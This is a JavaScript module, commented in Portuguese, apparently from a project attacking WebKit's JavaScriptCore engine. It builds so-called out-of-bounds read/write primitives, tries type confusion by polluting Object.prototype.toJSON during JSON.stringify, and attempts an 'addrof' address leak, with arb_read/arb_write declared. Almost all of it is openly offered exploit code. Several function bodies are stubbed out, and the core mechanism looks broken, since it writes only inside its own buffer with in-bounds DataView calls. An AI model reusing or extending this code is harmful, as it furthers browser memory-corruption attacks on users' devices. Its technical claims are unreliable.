// js/core_exploit.mjs (v31.R12 - Melhorias em attemptAddrof e consistência de offset)

import { AdvancedInt64, isAdvancedInt64Object, PAUSE, toHex } from './utils.mjs';
import { logS3 as log } from './script3/s3_utils.mjs'; // Logger padrão importado como 'log'
import { OOB_CONFIG, JSC_OFFSETS, updateOOBConfigFromUI } from './config.mjs';

export let oob_array_buffer_real = null;
export let oob_dataview_real = null;
let isOOBEnvironmentSetup = false;

const toHexHelper = (val, bits = 32) => toHex(val, bits);

const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58; 
// Usar M_LENGTH_OFFSET de config.mjs, mas se o alvo funcional para TC é 0x7C,
// então 0x58 + X = 0x7C => X = 0x24.
// Se JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET é 0x18 (dando 0x70),
// e 0x7C é o que funciona, precisamos de um offset específico para a escrita crítica do Heisenbug.
const HEISENBUG_TARGET_MLENGTH_EFFECTIVE_OFFSET = 0x7C; // Offset funcional para corromper m_length e causar TC

const OOB_DV_M_VECTOR_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; // 0x58 + 0x10 = 0x68
const OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; // 0x58 + 0x18 = 0x70 (usado para expandir o oob_dataview_real)
const OOB_DV_M_MODE_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;

// Funções de gerenciamento OOB (sem alterações da v31.R11)
export function clearOOBEnvironment(options = { force_clear_even_if_not_setup: false }) { 
    if (!isOOBEnvironmentSetup && !options.force_clear_even_if_not_setup) return;
    oob_array_buffer_real = null; oob_dataview_real = null; isOOBEnvironmentSetup = false;
}
export function getOOBAllocationSize() { if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") updateOOBConfigFromUI(document); return OOB_CONFIG.ALLOCATION_SIZE; }
export function getBaseOffsetInDV() { if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") updateOOBConfigFromUI(document); return OOB_CONFIG.BASE_OFFSET_IN_DV; }
export function getInitialBufferSize() { if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") updateOOBConfigFromUI(document); return OOB_CONFIG.INITIAL_BUFFER_SIZE; }

export async function triggerOOB_primitive(options = { force_reinit: false }) { 
    const FNAME_TRIGGER = 'CoreExploit.triggerOOB_primitive';
    if (isOOBEnvironmentSetup && !options.force_reinit) {
        let currentLength = 0; try { if(oob_dataview_real && oob_array_buffer_real && oob_array_buffer_real.byteLength > OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT + 3) currentLength = oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT, true); } catch(e){}
        if (oob_array_buffer_real && oob_dataview_real && oob_array_buffer_real.byteLength === getOOBAllocationSize() && oob_dataview_real.buffer === oob_array_buffer_real && currentLength === 0xFFFFFFFF) return true;
        else { log(`Ambiente OOB inconsistente. Forçando re-init.`, 'warn', FNAME_TRIGGER); clearOOBEnvironment({ force_clear_even_if_not_setup: true }); }
    }
    log(`--- Config Ambiente OOB (Force: ${options.force_reinit}, Anterior: ${isOOBEnvironmentSetup}) ---`, 'test', FNAME_TRIGGER);
    const currentAllocSize = getOOBAllocationSize(); clearOOBEnvironment({ force_clear_even_if_not_setup: true });
    try {
        oob_array_buffer_real = new ArrayBuffer(currentAllocSize); oob_dataview_real = new DataView(oob_array_buffer_real, 0, currentAllocSize);
        // Usa OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT (0x70) para expandir o oob_dataview_real para arb_read/write
        if (currentAllocSize > OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT + 3) {
            oob_dataview_real.setUint32(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT, 0xFFFFFFFF, true);
            log(`    m_length do oob_dataview_real (para arb R/W) expandido para 0xFFFFFFFF no offset ${toHexHelper(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT)}.`, 'info', FNAME_TRIGGER);
        } else { const eMsg = `Falha ao expandir m_length (arb R/W): AllocSize (${currentAllocSize}) pequeno para offset ${toHexHelper(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT)}.`; log(eMsg, 'critical', FNAME_TRIGGER); throw new Error(eMsg); }
        log(`Ambiente OOB CONFIGURADO. oob_dv.len=${oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT, true)}`, 'good', FNAME_TRIGGER);
        isOOBEnvironmentSetup = true; return true;
    } catch (e) { log(`ERRO CRÍTICO ${FNAME_TRIGGER}: ${e.message}`, 'critical', FNAME_TRIGGER); console.error(e); clearOOBEnvironment({ force_clear_even_if_not_setup: true }); throw e; }
}

// oob_read/write_absolute (sem alterações da v31.R11)
export function oob_read_absolute(offset_in_oob_buffer, byteLength) { /* ... */ 
    if (!isOOBEnvironmentSetup || !oob_dataview_real || !oob_array_buffer_real || oob_array_buffer_real.byteLength === 0) throw new Error("OOB Env não pronto para oob_read_absolute.");
    if (offset_in_oob_buffer < 0 || (offset_in_oob_buffer + byteLength) > oob_array_buffer_real.byteLength) throw new RangeError(`oob_read_absolute fora dos limites do oob_array_buffer_real`);
    try {
        switch (byteLength) {
            case 1: return oob_dataview_real.getUint8(offset_in_oob_buffer);
            case 2: return oob_dataview_real.getUint16(offset_in_oob_buffer, true);
            case 4: return oob_dataview_real.getUint32(offset_in_oob_buffer, true);
            case 8: { const l=oob_dataview_real.getUint32(offset_in_oob_buffer,true); const h=oob_dataview_real.getUint32(offset_in_oob_buffer+4,true); return new AdvancedInt64(l,h); }
            default: throw new Error(`Invalid byteLength for oob_read_absolute: ${byteLength}`);
        }
    } catch (e) { if (e.message.includes("detached")) isOOBEnvironmentSetup = false; throw e; }
}
export function oob_write_absolute(offset_in_oob_buffer, value, byteLength) { /* ... */
    if (!isOOBEnvironmentSetup || !oob_dataview_real || !oob_array_buffer_real || oob_array_buffer_real.byteLength === 0) throw new Error("OOB Env não pronto para oob_write_absolute.");
    if (offset_in_oob_buffer < 0 || (offset_in_oob_buffer + byteLength) > oob_array_buffer_real.byteLength) throw new RangeError(`oob_write_absolute fora dos limites do oob_array_buffer_real`);
    try {
        switch (byteLength) {
            case 1: oob_dataview_real.setUint8(offset_in_oob_buffer, Number(value)); break;
            case 2: oob_dataview_real.setUint16(offset_in_oob_buffer, Number(value), true); break;
            case 4: oob_dataview_real.setUint32(offset_in_oob_buffer, Number(value), true); break;
            case 8: { let v64=value; if(!isAdvancedInt64Object(v64)) v64=new AdvancedInt64(v64); oob_dataview_real.setUint32(offset_in_oob_buffer,v64.low(),true); oob_dataview_real.setUint32(offset_in_oob_buffer+4,v64.high(),true); break; }
            default: throw new Error(`Invalid byteLength for oob_write_absolute: ${byteLength}`);
        }
    } catch (e) { if (e.message.includes("detached")) isOOBEnvironmentSetup = false; throw e; }
}
export function isOOBReady() { /* ... (sem alterações da v31.R11, usa OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT) ... */
    let mLE = false; if (isOOBEnvironmentSetup && oob_dataview_real && oob_array_buffer_real) { try { if (oob_array_buffer_real.byteLength > OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT + 3) mLE = (oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT, true) === 0xFFFFFFFF); } catch (e) { mLE = false; } }
    return isOOBEnvironmentSetup && oob_array_buffer_real instanceof ArrayBuffer && oob_dataview_real instanceof DataView && oob_array_buffer_real.byteLength > 0 && oob_dataview_real.buffer === oob_array_buffer_real && mLE;
}

async function _perform_explicit_dv_reset_after_arb_op(fname_parent_for_log) { /* ... (sem alterações da v31.R11) ... */ }
export async function arb_read(absolute_address, byteLength) { /* ... (sem alterações da v31.R11) ... */ }
export async function arb_write(absolute_address, value, byteLength) { /* ... (sem alterações da v31.R11) ... */ }
export async function selfTestOOBReadWrite(logFnParam) { /* ... (sem alterações da v31.R11) ... */ }

// Constantes HEISENBUG_*
const HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC = HEISENBUG_TARGET_MLENGTH_EFFECTIVE_OFFSET; // Usar 0x7C para a TC
const HEISENBUG_CRITICAL_WRITE_VALUE = 0xFFFFFFFF;
const HEISENBUG_VICTIM_AB_SIZE_FOR_TC_CHECK = 64; 
const HEISENBUG_ADDROF_VICTIM_BUFFER_SIZE = 8;    

export async function selfTestTypeConfusionAndMemoryControl(logFnParam) { /* ... (sem alterações da v31.R11, mas usa HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC) ... */ }

// Variáveis globais para attemptAddrofUsingCoreHeisenbug e sua sonda
let _targetObjectForCoreAddrof_R12 = null; 
let _core_heisenbug_confirmed_by_probe_R12 = false;
let _core_victim_float_view_for_addrof_R12 = null; 
let _core_m2_victim_ref_R12 = null; // Removido de globalThis para evitar poluição, passado via closure implícita se a sonda for interna

function _toJSONProbeForCoreAddrof_R12() { 
    const FNAME_PROBE = "CoreExploit._toJSONProbeForCoreAddrof_R12";
    let currentThisType = Object.prototype.toString.call(this);
    
    // Verifica se 'this' é o objeto core_m2_victim PELO SEU CONTEÚDO/ID, não por referência estrita.
    // E se o tipo está confuso.
    if (this && this.id_m2_probe === "core_addrof_m2_target_R12" && currentThisType === '[object Object]') { 
        log(`[${FNAME_PROBE}] TC CONFIRMADA para core_m2_victim (ID correspondente)! Escrevendo targetObject...`, "vuln");
        _core_heisenbug_confirmed_by_probe_R12 = true; // Flag global do módulo
        if (_targetObjectForCoreAddrof_R12 && _core_victim_float_view_for_addrof_R12) {
            try {
                _core_victim_float_view_for_addrof_R12[0] = _targetObjectForCoreAddrof_R12;
                log(`[${FNAME_PROBE}] targetObject escrito em _core_victim_float_view_for_addrof_R12[0].`, "info");
            } catch (e_write) { 
                log(`[${FNAME_PROBE}] ERRO ao escrever targetObject: ${e_write.message}`, "error");
            }
        }
    } else if (this && this.id_m2_probe === "core_addrof_m2_target_R12") {
        log(`[${FNAME_PROBE}] 'this' é core_m2_victim (ID correspondente), mas tipo é ${currentThisType}, não [object Object]. TC falhou.`, "warn");
    } else {
        // log(`[${FNAME_PROBE}] 'this' type: ${currentThisType}. Não é o core_m2_victim esperado ou não tem ID.`, "leak");
    }
    return { core_addrof_probe_r12_executed: true, type_seen: currentThisType, is_expected_m2: (this && this.id_m2_probe === "core_addrof_m2_target_R12") };
}

export async function attemptAddrofUsingCoreHeisenbug(targetObject) { // MODIFICADO PARA R12
    const FNAME_FUNC = "CoreExploit.attemptAddrofUsingCoreHeisenbug_R12";
    log(`[${FNAME_FUNC}] Iniciando tentativa de addrof R12...`, "info");

    _targetObjectForCoreAddrof_R12 = targetObject; 
    _core_heisenbug_confirmed_by_probe_R12 = false; 
    _core_victim_float_view_for_addrof_R12 = null;
    // _core_m2_victim_ref_R12 não precisa ser globalThis se a sonda é definida no mesmo escopo ou acessa via closure indireto

    let addrof_result = { success: false, message: "Addrof (Heisenbug R12) não iniciado.", leaked_address_as_int64: null, leaked_address_as_double: null };
    let originalToJSON_R12 = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
    let pollutedByCore_R12 = false;

    try {
        await triggerOOB_primitive({ force_reinit: true }); 
        if (!isOOBReady()) { throw new Error("Ambiente OOB não pôde ser inicializado para Addrof R12."); }

        log(`[${FNAME_FUNC}] Escrevendo valor crítico ${toHexHelper(HEISENBUG_CRITICAL_WRITE_VALUE)} em ${toHexHelper(HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC)} para induzir TC.`, "warn");
        oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC, HEISENBUG_CRITICAL_WRITE_VALUE, 4); // Usa 0x7C
        await PAUSE(150); 

        let core_victim_buffer = new ArrayBuffer(HEISENBUG_ADDROF_VICTIM_BUFFER_SIZE); 
        _core_victim_float_view_for_addrof_R12 = new Float64Array(core_victim_buffer);
        _core_victim_float_view_for_addrof_R12.fill(0.123456789123); 
        log(`[${FNAME_FUNC}] core_victim_buffer e float_view criados.`, "info");

        let core_m2_victim_local = { 
            id_m2_probe: "core_addrof_m2_target_R12", // ID para a sonda verificar
            writer_view_ref: _core_victim_float_view_for_addrof_R12 
        };
        // Não precisa mais de globalThis._core_m2_victim_ref se _toJSONProbeForCoreAddrof_R12 for definida para capturá-lo de outra forma
        // ou se a verificação for baseada apenas no conteúdo como id_m2_probe.

        let core_m1_victim = { 
            id_m1: "core_addrof_m1_container_R12", 
            payload_m2: core_m2_victim_local // Usa o objeto local
        };
        log(`[${FNAME_FUNC}] Estrutura core_m1/m2_victim criada. Alvo do stringify: core_m1_victim.`, "info");
        
        Object.defineProperty(Object.prototype, 'toJSON', { value: _toJSONProbeForCoreAddrof_R12, writable: true, configurable: true, enumerable: false });
        pollutedByCore_R12 = true;
        
        JSON.stringify(core_m1_victim); 
        log(`[${FNAME_FUNC}] JSON.stringify(core_m1_victim) concluído. _core_heisenbug_confirmed_by_probe_R12: ${_core_heisenbug_confirmed_by_probe_R12}`, "info");
        
        if (_core_heisenbug_confirmed_by_probe_R12) {
            const val_double = _core_victim_float_view_for_addrof_R12[0]; 
            addrof_result.leaked_address_as_double = val_double;
            const temp_buf = new ArrayBuffer(8); new Float64Array(temp_buf)[0] = val_double;
            const temp_u32_view = new Uint32Array(temp_buf);
            const leaked_addr64 = new AdvancedInt64(temp_u32_view[0], temp_u32_view[1]);
            addrof_result.leaked_address_as_int64 = leaked_addr64;
            log(`[${FNAME_FUNC}] Heisenbug TC INTERNA confirmada! Lido de float_view[0]: Double=${val_double}, Int64=${leaked_addr64.toString(true)}`, "vuln");

            if (val_double !== 0.123456789123 && (leaked_addr64.low() !== 0 || leaked_addr64.high() !==0) ) {
                const lhi = leaked_addr64.high();
                const nan_inf = (lhi >= 0x7FF00000 && lhi < 0x80000000) || (lhi >= 0xFFF00000 && lhi < 0x100000000);
                if (!nan_inf) {
                    addrof_result.success = true;
                    addrof_result.message = `Addrof (Heisenbug R12) TC interna OK. Endereço potencial: ${leaked_addr64.toString(true)}`;
                } else { addrof_result.message = `Heisenbug TC interna OK, mas valor ${leaked_addr64.toString(true)} é NaN/Infinity.`;}
            } else { addrof_result.message = `Heisenbug TC interna OK, mas valor lido (${leaked_addr64.toString(true)}) é o de preenchimento ou zero.`;}
        } else { addrof_result.message = "Heisenbug TC INTERNA NÃO confirmada pela sonda _toJSONProbeForCoreAddrof_R12."; }
    } catch (e) { addrof_result.message = `Erro crítico em Addrof R12: ${e.message || String(e)}`; } 
    finally {
        if (pollutedByCore_R12) { if (originalToJSON_R12) Object.defineProperty(Object.prototype, 'toJSON', originalToJSON_R12); else delete Object.prototype.toJSON; }
        _targetObjectForCoreAddrof_R12 = null; _core_victim_float_view_for_addrof_R12 = null; 
    }
    log(`[${FNAME_FUNC}] Retornando resultado: ${JSON.stringify(addrof_result)}`, addrof_result.success ? "good" : "warn");
    return addrof_result;
}

// getStableConfusedArrayBuffer e get_powerful_dataview_on_oob_buffer (sem alterações da v31.R11)
export async function getStableConfusedArrayBuffer() { /* ... */ 
    const FNAME_GETTER = "CoreExploit.getStableConfusedArrayBuffer_R12";
    try {
        await triggerOOB_primitive({ force_reinit: true }); 
        if (!isOOBReady()) throw new Error("OOB Env não pronto para getStableConfusedArrayBuffer.");
        // triggerOOB_primitive já expande m_length do oob_dataview_real para 0xFFFFFFFF usando OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT (0x70)
        // HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC (0x7C) é usado para a TC do *próximo* buffer em attemptAddrofUsingCoreHeisenbug
        // Esta função deve retornar o oob_array_buffer_real, que já está "expandido"
        if (oob_array_buffer_real && oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT, true) === 0xFFFFFFFF) {
            return oob_array_buffer_real;
        } else {
            // Tenta a escrita OOB no offset que afeta o m_length do ArrayBufferContents de oob_array_buffer_real
            // Se OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT (0x70) é o m_length da *view*, o m_length do *ArrayBufferContents*
            // está em um offset diferente relativo ao início do oob_array_buffer_real (se o JSArrayBuffer e ArrayBufferContents estão lá).
            // Para simplificar e consistência com triggerOOB_primitive, confiamos que triggerOOB já expandiu.
            // Se não, a escrita em HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC (0x7C) seria para o próximo buffer.
            // Esta função precisa de uma revisão mais profunda se o objetivo é *apenas* corromper oob_array_buffer_real.
            // Por agora, confia em triggerOOB_primitive.
            log(`[${FNAME_GETTER}] AVISO: oob_array_buffer_real não parece expandido como esperado por triggerOOB_primitive.`, "warn");
            throw new Error("getStableConfusedArrayBuffer: oob_array_buffer_real não expandido.");
        }
    } catch (e) { log(`[${FNAME_GETTER}] ERRO: ${e.message}`, "critical"); return null; }
}
export async function get_powerful_dataview_on_oob_buffer() { /* ... (sem alterações da v31.R11) ... */ }
export function read_memory_with_dataview(dv, dv_base_address, target_address, num_bytes, littleEndian = true) { /* ... (sem alterações da v31.R11) ... */ }
export function write_memory_with_dataview(dv, dv_base_address, target_address, value, num_bytes, littleEndian = true) { /* ... (sem alterações da v31.R11) ... */ }
